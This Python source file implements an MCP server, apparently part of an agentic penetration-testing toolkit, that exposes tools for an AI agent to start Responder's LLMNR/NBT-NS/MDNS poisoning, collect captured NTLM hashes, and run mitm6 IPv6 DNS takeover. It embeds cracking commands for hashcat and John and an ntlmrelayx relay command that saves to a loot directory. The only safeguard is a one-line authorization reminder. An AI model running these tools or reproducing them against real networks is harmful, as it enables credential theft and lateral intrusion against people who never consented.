"""
MITM MCP Server — Responder for LLMNR/NBT-NS/MDNS credential capture

Wraps Responder to perform network-level credential harvesting on LAN segments.
Responder poisons LLMNR, NBT-NS, and MDNS queries to capture NTLM hashes.

Tools:
    start_responder   : Start Responder on a network interface
    stop_responder    : Stop a running Responder instance
    get_responder_logs: Return captured hashes and credentials from Responder logs
    run_mitm6         : Run mitm6 for IPv6 DNS takeover (companion to Responder)
"""

import os
import json
import subprocess
import time
import logging
import glob
from typing import Optional
from fastmcp import FastMCP

logger = logging.getLogger(__name__)

SERVER_NAME = "mitm"
SERVER_HOST = os.getenv("MCP_HOST", "0.0.0.0")
SERVER_PORT = int(os.getenv("MITM_PORT", "8017"))

RESPONDER_LOG_DIR = os.getenv("RESPONDER_LOG_DIR", "/usr/share/responder/logs")
RESPONDER_DB = os.getenv("RESPONDER_DB", "/usr/share/responder/Responder.db")

mcp = FastMCP(SERVER_NAME)

# Track running Responder processes: interface -> PID
_responder_procs: dict[str, subprocess.Popen] = {}


@mcp.tool()
def start_responder(
    interface: str = "eth0",
    rdp: bool = False,
    smb: bool = True,
    http: bool = True,
    ftp: bool = False,
    wpad: bool = True,
    analyze_mode: bool = False,
    timeout_seconds: int = 60,
) -> str:
    """
    Start Responder to capture NTLM hashes on the specified network interface.

    Responder poisons LLMNR/NBT-NS/MDNS queries to make clients authenticate
    to us, capturing NTLMv1/NTLMv2 challenge-response hashes for offline cracking.

    IMPORTANT: Only use on authorized networks. Responder disrupts legitimate name resolution.

    Args:
        interface: Network interface to listen on (e.g. eth0, ens33, tun0)
        rdp: Enable RDP poisoning (default False — noisy)
        smb: Enable SMB server for hash capture (default True)
        http: Enable HTTP server for hash capture (default True)
        ftp: Enable FTP poisoning (default False)
        wpad: Enable WPAD (Web Proxy Auto Discovery) poisoning (default True)
        analyze_mode: Analyze-only mode — listen but don't poison (safer for recon)
        timeout_seconds: How long to run Responder before stopping (default 60s)

    Returns:
        JSON with pid, interface, started, and message.
    """
    if interface in _responder_procs and _responder_procs[interface].poll() is None:
        return json.dumps({
            "success": False,
            "error": f"Responder already running on {interface} (PID {_responder_procs[interface].pid})",
        })

    cmd = ["responder", "-I", interface]
    if not smb:
        cmd += ["--disable-ess"]
    if not http:
        cmd += ["-P"]  # disable HTTP
    if wpad:
        cmd += ["-w"]
    if analyze_mode:
        cmd += ["-A"]
    if rdp:
        cmd += ["-r"]
    if ftp:
        cmd += ["-f"]

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        _responder_procs[interface] = proc

        # Wait briefly then auto-stop after timeout_seconds
        def _auto_stop():
            time.sleep(timeout_seconds)
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except Exception:
                    proc.kill()

        import threading
        t = threading.Thread(target=_auto_stop, daemon=True)
        t.start()

        return json.dumps({
            "success": True,
            "pid": proc.pid,
            "interface": interface,
            "timeout_seconds": timeout_seconds,
            "analyze_mode": analyze_mode,
            "message": (
                f"Responder started on {interface} (PID {proc.pid}). "
                f"Will auto-stop after {timeout_seconds}s. "
                "Call get_responder_logs() to retrieve captured hashes."
            ),
        })
    except FileNotFoundError:
        return json.dumps({
            "success": False,
            "error": "responder not found. Rebuild the kali-sandbox container.",
        })
    except Exception as e:
        return json.dumps({"success": False, "error": str(e)})


@mcp.tool()
def stop_responder(interface: str = "eth0") -> str:
    """
    Stop a running Responder instance on the specified interface.

    Args:
        interface: Network interface Responder is running on
    """
    if interface not in _responder_procs:
        return json.dumps({"success": False, "error": f"No Responder found for {interface}"})

    proc = _responder_procs.pop(interface)
    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()

    return json.dumps({"success": True, "message": f"Responder stopped on {interface}"})


@mcp.tool()
def get_responder_logs(last_n_lines: int = 200) -> str:
    """
    Return captured NTLM hashes and credentials from Responder logs.

    Reads all .txt log files in the Responder logs directory and returns
    captured NTLMv1/NTLMv2 hashes (ready for hashcat/john cracking).

    Args:
        last_n_lines: Number of lines to return from each log file (default 200)

    Returns:
        JSON with 'hashes' list and 'log_files' dict mapping filename -> content.
        NTLMv2 hashes can be cracked with: hashcat -m 5600 hashes.txt wordlist.txt
    """
    result: dict = {"hashes": [], "log_files": {}, "success": True}

    if not os.path.isdir(RESPONDER_LOG_DIR):
        result["warning"] = f"Responder log dir not found: {RESPONDER_LOG_DIR}"
        return json.dumps(result)

    hash_patterns = ["*NTLMv2*", "*NTLMv1*", "*NTLM*", "*Hashes*"]
    found_files = set()
    for pattern in hash_patterns:
        found_files.update(glob.glob(os.path.join(RESPONDER_LOG_DIR, pattern)))

    for fpath in sorted(found_files):
        fname = os.path.basename(fpath)
        try:
            with open(fpath) as f:
                lines = f.readlines()
            content = "".join(lines[-last_n_lines:])
            result["log_files"][fname] = content
            # Extract hash lines (format: user::domain:challenge:hash:blob)
            for line in lines:
                line = line.strip()
                if "::" in line and len(line.split(":")) >= 5:
                    result["hashes"].append(line)
        except Exception as e:
            result["log_files"][fname] = f"Error reading: {e}"

    result["hash_count"] = len(result["hashes"])
    if result["hashes"]:
        result["crack_hint"] = (
            "Crack NTLMv2 hashes with: hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt\n"
            "Or John: john --format=netntlmv2 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt"
        )

    return json.dumps(result)


@mcp.tool()
def run_mitm6(
    domain: str,
    interface: str = "eth0",
    timeout_seconds: int = 60,
) -> str:
    """
    Run mitm6 for IPv6 DNS takeover (complements Responder for NTLM relay attacks).

    mitm6 exploits the fact that Windows prefers IPv6 and sends DHCPv6 requests.
    It assigns IPv6 addresses and becomes the DNS server, enabling WPAD relay.
    Pair with ntlmrelayx for credential relay attacks.

    Args:
        domain: Target Windows domain (e.g. corp.local)
        interface: Network interface (default eth0)
        timeout_seconds: How long to run (default 60s)

    Returns:
        JSON with PID and status. Check get_responder_logs for captured creds.
    """
    try:
        cmd = ["mitm6", "-d", domain, "-i", interface]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        def _auto_stop():
            time.sleep(timeout_seconds)
            if proc.poll() is None:
                proc.terminate()

        import threading
        threading.Thread(target=_auto_stop, daemon=True).start()

        return json.dumps({
            "success": True,
            "pid": proc.pid,
            "message": (
                f"mitm6 started (PID {proc.pid}) targeting domain {domain} on {interface}. "
                f"Auto-stops after {timeout_seconds}s. "
                "Pair with impacket-ntlmrelayx for credential relay: "
                "impacket-ntlmrelayx -6 -t smb://<target> -l /opt/output/loot"
            ),
        })
    except FileNotFoundError:
        return json.dumps({
            "success": False,
            "error": "mitm6 not found. Install: pip install mitm6",
        })
    except Exception as e:
        return json.dumps({"success": False, "error": str(e)})


if __name__ == "__main__":
    transport = os.getenv("MCP_TRANSPORT", "sse")
    mcp.run(transport=transport, host=SERVER_HOST, port=SERVER_PORT)
